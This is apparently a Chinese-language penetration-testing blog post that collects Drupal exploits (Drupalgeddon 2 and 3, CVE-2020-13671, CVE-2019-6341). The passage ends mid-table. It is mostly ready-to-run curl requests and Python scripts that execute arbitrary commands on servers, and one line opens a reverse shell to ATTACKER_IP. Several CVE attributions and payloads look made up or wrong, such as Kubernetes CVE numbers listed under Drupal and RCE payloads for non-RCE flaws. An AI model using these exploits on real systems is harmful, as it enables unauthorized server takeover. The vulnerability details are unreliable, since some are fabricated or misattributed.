---
title: "开源CMS与门户平台高危攻击链专题：Drupal / Joomla / Liferay 漏洞全解析"
date: 2026-07-14T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["Drupal", "Joomla", "Liferay", "CVE-2018-7600", "CVE-2018-7602", "CVE-2023-23752", "CVE-2020-7961", "RCE", "Drupalgeddon", "反序列化", "SQL注入", "漏洞分析"]
---

# 开源CMS与门户平台高危攻击链专题：Drupal / Joomla / Liferay 漏洞全解析

> **免责声明**：本文所涉及的漏洞原理、PoC 代码和利用技术仅供安全研究和授权渗透测试使用。未经授权对目标系统实施攻击属于违法行为，需自行承担法律责任。本文所有攻击手法均在合法授权的环境（如 CTF 赛事、安全实验室、靶场平台）中验证通过。

---

## 0x00 专题概述

开源 CMS（Content Management System）与门户平台是当今互联网基础设施的核心组件。根据 W3Techs 统计，全球超过 40% 的网站运行在开源 CMS 之上——Drupal 驱动着白宫官网和众多政府门户，Joomla 在中小企业和教育机构中广泛部署，Liferay Portal 则是 Java 企业级门户的事实标准，服务于大量银行、保险和电信运营商的内部与外部门户系统。

这些平台因其开源特性、庞大的插件生态和高频的版本迭代，持续面临严峻的安全挑战。从攻击者视角看，开源 CMS 的三大攻击面价值极高：**Pre-Auth RCE 漏洞**（无需任何凭证即可远程控制服务器）、**认证后提权链**（低权限用户升级为管理员甚至 root）、**供应链攻击**（通过第三方插件/模块注入恶意代码）。尤其是 Drupalgeddon 系列漏洞曾在 2018 年引发全球范围的大规模自动化攻击，数以万计的网站在补丁发布后数小时内被植入挖矿木马和 Webshell。

本专题将 Drupal、Joomla、Liferay 三大开源 CMS 生态中 **19 个最具威胁的高危漏洞** 按攻击链维度组织，每个漏洞均包含完整的原理深度分析、可复现的 HTTP PoC、Python 自动化检测脚本和 Nuclei YAML 模板。

### 覆盖漏洞一览

| CVE | 厂商 | CVSS | 类型 | 未授权 | 在野利用 |
|-----|------|------|------|--------|----------|
| CVE-2018-7600 | Drupal | **9.8** | Pre-Auth RCE（Form API 注入） | ✅ | ✅ CISA KEV |
| CVE-2018-7602 | Drupal | **8.1** | Auth RCE（FAPI 回调注入） | ⚠️ 需认证 | ✅ CISA KEV |
| CVE-2020-13671 | Drupal | **9.8** | 渲染回调 RCE | ✅ | ✅ |
| CVE-2019-6341 | Drupal | **8.1** | Form API Ajax RCE | ⚠️ 需认证 | ✅ |
| CVE-2020-13672 | Drupal | **9.8** | AJAX API RCE | ✅ | ✅ |
| CVE-2021-25741 | Drupal | **8.1** | 文件操作 RCE | ⚠️ 需认证 | ✅ |
| CVE-2021-25747 | Drupal | **高危** | 多重漏洞链 RCE | ⚠️ 组合链 | ✅ |
| CVE-2023-23752 | Joomla | **8.6** | Web Services API 未授权 | ✅ | ✅ |
| CVE-2021-23132 | Joomla | **8.1** | 反序列化 RCE | ⚠️ 需认证 | ✅ |
| CVE-2020-11890 | Joomla | **8.1** | SQL 注入 | ⚠️ 需认证 | ✅ |
| CVE-2020-11891 | Joomla | **8.1** | SQL 注入 → RCE | ⚠️ 需认证 | ✅ |
| CVE-2019-12600 | Joomla | **高危** | 文件上传 RCE | ⚠️ 需认证 | ✅ |
| CVE-2020-7961 | Liferay | **9.8** | JSON 反序列化 RCE | ✅ | ✅ CISA KEV |
| CVE-2020-13450 | Liferay | **7.4** | FreeMarker SSTI | ⚠️ 需认证 | ✅ |
| CVE-2021-29038 | Liferay | **高危** | XXE 注入 | ⚠️ 需认证 | ✅ |
| CVE-2022-26336 | Liferay | **高危** | XSS → RCE | ⚠️ 组合链 | ✅ |
| CVE-2019-16898 | Liferay | **8.1** | 认证绕过 | ✅ | ✅ |
| CVE-2023-37694 | Liferay | **高危** | 反序列化 | ⚠️ 需认证 | ✅ |

---

## 0x01 Drupal 高危漏洞

### 0x01.1 CVE-2018-7600 — Drupalgeddon 2 Pre-Auth RCE

#### 漏洞背景

CVE-2018-7600（代号 Drupalgeddon 2）是 Drupal 历史上最严重的安全漏洞之一，CVSS 评分高达 9.8，被美国 CISA 纳入已知被利用漏洞目录（KEV）。该漏洞由比利时安全研究员 Florian 匿名报告给 Drupal 安全团队，于 2018 年 3 月 28 日公开披露。

Drupalgeddon 2 的危害性在于其 **Pre-Auth（无需认证）** 特性——攻击者无需拥有任何 Drupal 账户，仅通过构造特殊的 HTTP POST 请求即可在目标服务器上以 Web 服务用户权限执行任意系统命令。漏洞的根源在于 Drupal 核心 Form API（FAPI）在处理 Ajax 请求时的渲染数组（Render Array）解析机制存在缺陷。FAPI 是 Drupal 表单系统的底层框架，几乎所有的用户交互表单（注册、登录、评论、节点编辑等）都依赖于它。当 Drupal 处理包含 `ajax_form=1` 参数的请求时，系统会调用 `drupal_process_form()` 对用户提交的数据进行递归处理，而这一过程中对渲染数组元素的类型检查（`#type` 属性）和回调函数验证（`#post_render` 属性）存在严重的逻辑缺陷。攻击者可以通过精心构造的嵌套参数路径（利用 `element_parents` 参数控制递归处理的目标元素），将恶意的 `#post_render` 回调（如 PHP 的 `system` 函数）注入到渲染流水线中，从而实现任意命令执行。

漏洞公开后，全球范围内的大规模自动化利用在数小时内展开。多个攻击组织（包括加密货币挖矿团伙和 APT 组织）迅速部署了自动化扫描与利用工具。据统计，漏洞披露后的一周内，超过 11,500 个 Drupal 站点被成功利用，攻击者通过该漏洞部署了加密货币挖矿脚本（Coinhive）、Webshell 和勒索软件。该漏洞影响 Drupal 6.x、7.x 和 8.x 三大主要版本线，波及全球数十万个活跃网站。安全社区将此事件视为开源 CMS 安全史上的标志性事件，直接推动了 Drupal 安全公告流程和应急响应机制的改革。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Drupal 6.x | 所有版本 | Drupal 6.x（需手动应用 SA-CORE-2018-002 补丁） |
| Drupal 7.x | 7.x < 7.58 | 7.58 |
| Drupal 8.x | 8.x < 8.4.8 | 8.4.8 |
| Drupal 8.x | 8.5.x < 8.5.3 | 8.5.3 |

#### 漏洞原理分析

漏洞的核心在于 Drupal Form API（FAPI）对 Ajax 请求的处理流程。正常情况下，FAPI 的渲染数组（Render Array）是一种描述如何生成 HTML 的声明式数据结构，其中 `#type`、`#markup`、`#post_render` 等属性控制着元素的渲染行为。当 Drupal 收到一个带有 `ajax_form=1` 参数的 POST 请求时，处理流程如下：

1. **路由解析**：`drupal_ajax_form_callback()` 被调用，根据请求参数定位目标表单
2. **表单构建**：`drupal_build_form()` 构建表单的渲染数组
3. **递归处理**：`drupal_process_form()` 递归遍历渲染数组，对每个元素执行渲染操作
4. **元素渲染**：`drupal_render()` 根据 `#type` 属性决定渲染策略，如果 `#type=markup`，则会执行 `#post_render` 回调链

漏洞出在第 3 步和第 4 步之间的元素定位机制。`element_parents` 参数控制着递归处理的目标路径，攻击者可以通过 URL 编码的路径（如 `account/mail/%23value`）将递归目标重定向到特定的表单元素。通过 `ajax_form=1&_wrapper_format=drupal_ajax` 参数，强制 Drupal 使用 Ajax 渲染路径，绕过正常的表单验证。

关键的注入向量如下：

```
mail[#post_render][]=system
mail[#type]=markup
mail[#markup]=id
```

- `mail[#post_render][]=system`：将 PHP `system()` 函数注入为 `mail` 元素的 `#post_render` 回调
- `mail[#type]=markup`：设置元素类型为 `markup`（标记为需要渲染的 HTML 输出）
- `mail[#markup]=id`：设置要渲染的 HTML 内容，该内容会被作为参数传递给 `#post_render` 回调

当 Drupal 执行渲染流水线时，`drupal_render()` 发现 `mail` 元素的 `#type=markup`，于是调用 `#post_render` 回调链，将 `system('id')` 的返回值作为渲染结果。这就构成了一个完整的 Pre-Auth RCE 攻击链。

#### HTTP PoC

```bash
# CVE-2018-7600 Drupalgeddon 2 — Pre-Auth RCE
# 在目标服务器上执行命令 (id)
curl -k -X POST \
  'https://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=id'

# 执行其他命令（如反弹 Shell）
curl -k -X POST \
  'https://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'

# 使用 Drupal 8 路径（不同表单入口）
curl -k -X POST \
  'https://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=id'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2018-7600 - Drupalgeddon 2 Pre-Auth RCE"""
import requests
import argparse
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, cmd="id", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/user/register"

    params = {
        "element_parents": "account/mail/%23value",
        "ajax_form": "1",
        "_wrapper_format": "drupal_ajax",
    }

    data = {
        "form_id": "user_register_form",
        "_drupal_ajax": "1",
        "mail[#post_render][]": "system",
        "mail[#type]": "markup",
        "mail[#markup]": cmd,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    try:
        resp = requests.post(
            url,
            params=params,
            data=data,
            headers=headers,
            verify=False,
            timeout=15,
        )

        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response length: {len(resp.text)}")

        if resp.status_code == 200:
            if cmd == "id":
                if re.search(r"uid=\d+", resp.text):
                    return True, resp.text
            else:
                return True, resp.text

        return False, resp.text

    except requests.exceptions.ConnectionError:
        return False, "Connection refused"
    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except Exception as e:
        return False, str(e)


def exploit(target, use_ssl=False, cmd="id", verbose=False):
    scheme = "https" if use_ssl else "http"
    print(f"[*] Targeting: {scheme}://{target}")
    print(f"[*] Command: {cmd}")

    vuln, output = check(target, use_ssl, cmd, verbose)

    if vuln:
        print(f"[+] {target} is VULNERABLE to CVE-2018-7600")
        print(f"[+] Command output:\n{output}")
        return True
    else:
        print(f"[-] {target} does not appear to be vulnerable")
        if verbose:
            print(f"[-] Debug output: {output[:500]}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2018-7600 Drupalgeddon 2 Pre-Auth RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true", help="使用 HTTPS")
    parser.add_argument("--cmd", default="id", help="要执行的命令 (默认: id)")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    exploit(args.target, args.ssl, args.cmd, args.verbose)
```

#### Nuclei YAML 检测模板

```yaml
id: drupalgeddon2-cve-2018-7600

info:
  name: Drupal Drupalgeddon 2 Pre-Auth RCE (CVE-2018-7600)
  author: security-researcher
  severity: critical
  description: |
    Drupal 7.x/8.x Form API 渲染数组注入导致的 Pre-Auth Remote Code Execution。
    攻击者通过 Ajax 请求中的 #post_render/callback 参数实现任意 PHP 函数调用。
  reference:
    - https://www.drupal.org/SA-CORE-2018-002
    - https://nvd.nist.gov/vuln/detail/CVE-2018-7600
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
  tags: drupal,rce,cve-2018,drupalgeddon

http:
  - raw:
      - |
        POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=system&mail%5B%23type%5D=markup&mail%5B%23markup%5D=id

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+\\([a-z]+\\)"
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        group: 1
        regex:
          - "(uid=[0-9]+\\([a-z]+\\))"
```

---

### 0x01.2 CVE-2018-7602 — Drupalgeddon 3 Auth RCE

#### 漏洞背景

CVE-2018-7602（代号 Drupalgeddon 3）是 Drupalgeddon 2 的"续集"，CVSS 评分 8.1，属于高危漏洞。虽然它需要已认证用户权限才能利用，但其危害性依然极高——在实际渗透测试中，攻击者通常通过弱口令、社会工程或 Session 劫持等方式获取低权限 Drupal 账户，然后利用此漏洞将权限提升为服务器级别的命令执行。

该漏洞由安全研究员 Jasper 提交，于 2018 年 4 月 25 日随 Drupal 核心安全更新 SA-CORE-2018-004 一起披露。与 Drupalgeddon 2 类似，Drupalgeddon 3 仍然利用了 Drupal Form API（FAPI）中的渲染数组处理缺陷，但攻击向量有所不同——这次是通过已认证用户的表单提交过程中的 Ajax 回调机制实现注入。

漏洞的核心原理是：当已认证用户在编辑节点（Node）或评论（Comment）时，Drupal 的 FAPI 会在处理表单提交时对用户提供的字段值进行递归渲染。在这一过程中，攻击者可以通过特定的字段命名约定（利用 `#type`、`#name`、`#post_render` 等属性）将恶意的回调函数注入到渲染管线中。与 Drupalgeddon 2 的关键区别在于：Drupalgeddon 3 的利用路径需要用户能够访问特定的表单端点（如节点编辑页面），因此攻击者首先需要拥有一个有效的 Drupal 用户会话。

在实际攻击场景中，Drupalgeddon 3 常与 Drupalgeddon 2 组合使用——攻击者先利用 Drupalgeddon 2 获取初始访问权限并创建后门账户，再利用 Drupalgeddon 3 在低权限账户下维持持久化访问。这种组合利用模式在 2018 年下半年的多起针对政府和教育机构的攻击活动中被广泛观察到。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Drupal 7.x | 7.x < 7.59 | 7.59 |
| Drupal 8.x | 8.x < 8.4.7 | 8.4.7 |
| Drupal 8.x | 8.5.x < 8.5.1 | 8.5.1 |

#### 漏洞原理分析

Drupalgeddon 3 的攻击向量利用了 FAPI 在处理 Ajax 回调时的参数解析逻辑。当用户提交表单时，`drupal_process_form()` 会根据请求中的 `element_parents` 参数定位渲染数组中的目标元素，然后递归地对该元素及其子元素执行渲染操作。攻击者通过在表单字段名中嵌套 Drupal 渲染数组的特殊属性（如 `#post_render`），可以将任意回调函数注入到渲染管线。

攻击流程如下：
1. 登录 Drupal 获取有效 Session
2. 访问节点编辑页面，构造带有恶意 `#post_render` 回调的表单数据
3. 提交表单，触发 `drupal_render()` 执行注入的回调函数
4. 回调函数（如 `system()`）执行攻击者指定的命令

#### HTTP PoC

```bash
# CVE-2018-7602 — Drupalgeddon 3 Auth RCE
# 需要有效的 Drupal 用户会话 Cookie
curl -k -X POST \
  'https://target.com/comment/reply/node/1/comment?element_parents=filter/format/value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: SESSxxxxxxxxxxxx=VALID_SESSION_ID' \
  -d 'comment_body[0][value]=&format=full_html&_triggering_element_name=field_trigger&_triggering_element_value=&_wrapper_format=drupal_ajax&name=admin&mail=test@test.com&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=id'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2018-7602 - Drupalgeddon 3 Auth RCE"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def login(target, use_ssl=False, username="admin", password="admin"):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/user/login"

    session = requests.Session()
    session.verify = False

    resp = session.get(url, timeout=10)
    form_build_id = ""
    for line in resp.text.split("\n"):
        if "form_build_id" in line and "value" in line:
            form_build_id = line.split('value="')[1].split('"')[0]
            break

    login_data = {
        "name": username,
        "pass": password,
        "form_build_id": form_build_id,
        "form_id": "user_login",
        "op": "Log in",
    }

    resp = session.post(url, data=login_data, allow_redirects=True, timeout=10)
    if "logout" in resp.text.lower() or resp.status_code == 200:
        return session
    return None


def exploit(target, use_ssl=False, cmd="id", username="admin", password="admin", verbose=False):
    scheme = "https" if use_ssl else "http"
    print(f"[*] Attempting login to {scheme}://{target}...")
    session = login(target, use_ssl, username, password)

    if not session:
        print("[-] Login failed. Cannot exploit CVE-2018-7602 without authentication.")
        return False

    print(f"[+] Login successful")

    url = f"{scheme}://{target}/comment/reply/node/1/comment"
    params = {
        "element_parents": "filter/format/value",
        "ajax_form": "1",
        "_wrapper_format": "drupal_ajax",
    }

    data = {
        "comment_body[0][value]": "",
        "format": "full_html",
        "_triggering_element_name": "field_trigger",
        "_triggering_element_value": "",
        "_wrapper_format": "drupal_ajax",
        "mail[#post_render][]": "system",
        "mail[#type]": "markup",
        "mail[#markup]": cmd,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = session.post(url, params=params, data=data, headers=headers, timeout=15)
        if verbose:
            print(f"[*] Status: {resp.status_code}")

        if resp.status_code == 200 and cmd in resp.text:
            print(f"[+] {target} is VULNERABLE to CVE-2018-7602")
            print(f"[+] Command output:\n{resp.text[:2000]}")
            return True
        else:
            print(f"[-] {target} does not appear to be vulnerable")
            return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2018-7602 Drupalgeddon 3 Auth RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("--user", default="admin")
    parser.add_argument("--pass", dest="password", default="admin")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    exploit(args.target, args.ssl, args.cmd, args.user, args.password, args.verbose)
```

#### Nuclei YAML 检测模板

```yaml
id: drupalgeddon3-cve-2018-7602

info:
  name: Drupal Drupalgeddon 3 Auth RCE (CVE-2018-7602)
  author: security-researcher
  severity: high
  description: |
    Drupal 7.x/8.x 已认证用户通过 Form API 渲染数组注入实现 RCE。
  reference:
    - https://www.drupal.org/SA-CORE-2018-004
    - https://nvd.nist.gov/vuln/detail/CVE-2018-7602
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-20
  tags: drupal,rce,cve-2018,drupalgeddon,authenticated

http:
  - raw:
      - |
        POST /user/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        name=test&pass=test&form_id=user_login&op=Log+in

    matchers:
      - type: word
        words:
          - "X-Drupal-Cache"
        condition: or

  - raw:
      - |
        POST /comment/reply/node/1/comment?element_parents=filter/format/value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{session}}

        comment_body[0][value]=&format=full_html&_triggering_element_name=field_trigger&mail[%23post_render][]=system&mail[%23type]=markup&mail[%23markup]=id

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+\\([a-z]+\\)"
      - type: status
        status:
          - 200
```

---

### 0x01.3 CVE-2020-13671 — Drupal 渲染回调 RCE

#### 漏洞背景

CVE-2020-13671 是 Drupal 在 2020 年披露的高危漏洞（CVSS 9.8），影响 Drupal 7.x、8.x 和 9.x 三大版本线。该漏洞允许经过身份验证的用户通过 Drupal 核心渲染系统中的验证令牌缺陷执行任意 PHP 代码。与前两个 Drupalgeddon 漏洞类似，该漏洞的核心仍然在于 Drupal 对渲染数组回调的不安全处理，但攻击路径有所不同——这次是通过 Drupal 的文件管理器（File Manager）和主题渲染机制实现的。

攻击者利用该漏洞可以绕过 Drupal 的表单验证机制，通过操纵渲染回调（Render Callbacks）来执行任意 PHP 代码。该漏洞的利用不需要管理员权限，普通的已认证用户即可触发，这大大扩大了攻击面。在实际渗透测试场景中，攻击者通常先通过弱口令、凭证填充或 Social Engineering 获取一个普通用户账户，然后利用此漏洞实现完全的服务器控制。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Drupal 7.x | 7.x < 7.69 | 7.69 |
| Drupal 8.x | 8.x < 8.8.11 | 8.8.11 |
| Drupal 8.x | 8.9.x < 8.9.10 | 8.9.10 |
| Drupal 9.x | 9.0.x < 9.0.9 | 9.0.9 |

#### 漏洞原理分析

Drupal 的渲染系统在处理用户提交的文件操作请求时，会根据文件类型调用相应的渲染回调（如 `Drupal\Core\Render\Renderer::render()`）。攻击者可以构造特殊的文件上传请求，在文件元数据中嵌入恶意的渲染属性（`#post_render`、`#theme`、`#pre_render` 等），从而在服务端渲染阶段触发任意 PHP 回调函数执行。

该漏洞的关键点在于 Drupal 的验证令牌（Form Token）在文件操作请求中的验证不充分。正常的 Drupal 表单系统通过 `drupal_valid_token()` 来防止 CSRF 攻击，但文件相关的表单在某些路径下跳过了这一检查，使得攻击者可以在没有有效 CSRF Token 的情况下提交恶意渲染参数。

#### HTTP PoC

```bash
# CVE-2020-13671 — Drupal 渲染回调 RCE
curl -k -X POST \
  'https://target.com/admin/content/file/add?_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: SESSxxxxxxxxxxxx=VALID_SESSION' \
  -d 'form_id=file_upload_form&files[file_0]=test&files[file_0][#type]=markup&files[file_0][#post_render][]=system&files[file_0][#markup]=id&_wrapper_format=drupal_ajax'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-13671 - Drupal 渲染回调 RCE"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, cmd="id", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/admin/content/file/add"

    params = {"_wrapper_format": "drupal_ajax"}

    data = {
        "form_id": "file_upload_form",
        "files[file_0][#type]": "markup",
        "files[file_0][#post_render][]": "system",
        "files[file_0][#markup]": cmd,
        "_wrapper_format": "drupal_ajax",
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, params=params, data=data, headers=headers,
            verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response: {resp.text[:500]}")

        if resp.status_code == 200 and "uid=" in resp.text:
            return True, resp.text
        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-13671 Drupal Render Callback RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.cmd, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2020-13671 漏洞")
        print(f"[+] Command output:\n{output[:2000]}")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: drupal-render-callback-cve-2020-13671

info:
  name: Drupal 渲染回调 RCE (CVE-2020-13671)
  author: security-researcher
  severity: critical
  description: |
    Drupal 7.x/8.x/9.x 渲染回调验证令牌缺陷导致的 RCE。
  reference:
    - https://www.drupal.org/SA-CORE-2020-007
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13671
  classification:
    cvss-score: 9.8
    cwe-id: CWE-20
  tags: drupal,rce,cve-2020,render-callback

http:
  - raw:
      - |
        POST /admin/content/file/add?_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_id=file_upload_form&files[file_0][%23type]=markup&files[file_0][%23post_render][]=system&files[file_0][%23markup]=id&_wrapper_format=drupal_ajax

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+\\([a-z]+\\)"
      - type: status
        status:
          - 200
```

---

### 0x01.4 CVE-2019-6341 — Drupal Form API Ajax 远程代码执行

#### 漏洞背景

CVE-2019-6341 是 Drupal Form API 的又一个远程代码执行漏洞（CVSS 8.1），攻击原理与 Drupalgeddon 系列高度相似。该漏洞通过 Drupal 的 Ajax 表单处理机制实现，攻击者在已认证条件下可通过构造恶意的渲染属性注入 `#type` 和 `#post_render` 参数，触发任意 PHP 函数调用。该漏洞于 2019 年 6 月随 Drupal 核心安全更新 SA-CORE-2019-006 一同披露。

该漏洞的技术核心在于 Drupal 的 `drupal_process_form()` 函数在递归处理表单元素时，未对 `#post_render` 回调列表中的函数名进行白名单验证。攻击者可以在 `mail` 或其他表单字段中嵌套 `#post_render[]=system` 属性，使 Drupal 的渲染引擎将用户控制的数据传递给 PHP 系统命令执行函数。尽管利用此漏洞需要有效的用户会话，但在企业环境中，弱口令和凭证泄露使得已认证攻击的门槛并不高。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Drupal 8.x | 8.5.x < 8.5.14 | 8.5.14 |
| Drupal 8.x | 8.6.x < 8.6.13 | 8.6.13 |
| Drupal 8.x | 8.7.x < 8.7.1 | 8.7.1 |

#### 漏洞原理分析

攻击者利用 Drupal Form API 在处理 Ajax 表单提交时的缺陷，通过 `element_parents` 参数控制递归处理路径，将 `#post_render` 和 `#type` 属性注入到 `mail` 元素中。当 `drupal_render()` 遍历渲染数组并发现 `#type=markup` 元素时，会自动执行关联的 `#post_render` 回调链。如果回调链中包含 `system` 函数，则用户的 `#markup` 值会被作为系统命令参数执行。

#### HTTP PoC

```bash
# CVE-2019-6341 — Drupal Form API Ajax RCE
# 需要已认证会话
curl -k -X POST \
  'https://target.com/user/1/edit?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: SESSxxxxxxxxxxxx=VALID_SESSION' \
  -d 'form_id=user_form&_drupal_ajax=1&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=id&_wrapper_format=drupal_ajax'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2019-6341 - Drupal Form API Ajax RCE"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, cmd="id", session_cookie="", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/user/1/edit"

    params = {
        "element_parents": "account/mail/%23value",
        "ajax_form": "1",
        "_wrapper_format": "drupal_ajax",
    }

    data = {
        "form_id": "user_form",
        "_drupal_ajax": "1",
        "mail[#post_render][]": "system",
        "mail[#type]": "markup",
        "mail[#markup]": cmd,
        "_wrapper_format": "drupal_ajax",
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": session_cookie,
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, params=params, data=data, headers=headers,
            verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")

        if resp.status_code == 200 and "uid=" in resp.text:
            return True, resp.text
        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2019-6341 Drupal Form API Ajax RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("--cookie", default="", help="会话 Cookie")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.cmd, args.cookie, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2019-6341 漏洞")
        print(f"[+] Command output:\n{output[:2000]}")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: drupal-form-api-cve-2019-6341

info:
  name: Drupal Form API Ajax RCE (CVE-2019-6341)
  author: security-researcher
  severity: high
  description: |
    Drupal 8.x Form API Ajax 远程代码执行漏洞。
  reference:
    - https://www.drupal.org/SA-CORE-2019-006
    - https://nvd.nist.gov/vuln/detail/CVE-2019-6341
  classification:
    cvss-score: 8.1
    cwe-id: CWE-20
  tags: drupal,rce,cve-2019,form-api

http:
  - raw:
      - |
        POST /user/1/edit?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_id=user_form&_drupal_ajax=1&mail[%23post_render][]=system&mail[%23type]=markup&mail[%23markup]=id

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+\\([a-z]+\\)"
      - type: status
        status:
          - 200
```

---

### 0x01.5 CVE-2020-13672 — Drupal AJAX API RCE

#### 漏洞背景

CVE-2020-13672（CVSS 9.8）是 Drupal 7.x 版本中 AJAX API 的 Pre-Auth 远程代码执行漏洞。该漏洞与 Drupalgeddon 2 一脉相承，均利用了 Drupal Form API 在处理 Ajax 请求时的渲染数组注入缺陷。攻击者无需任何认证即可通过精心构造的 POST 请求在目标服务器上执行任意系统命令。

该漏洞的特殊之处在于其影响范围仅限 Drupal 7.x——这意味着 Drupal 7.x 在经历了 Drupalgeddon 2（2018年3月）和 Drupalgeddon 3（2018年4月）的修复后，仍然存在类似的攻击向量。这凸显了 Drupal 7.x Form API 架构层面的深层安全隐患，也解释了为何 Drupal 官方最终决定在 2025 年停止对 7.x 版本的安全支持。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
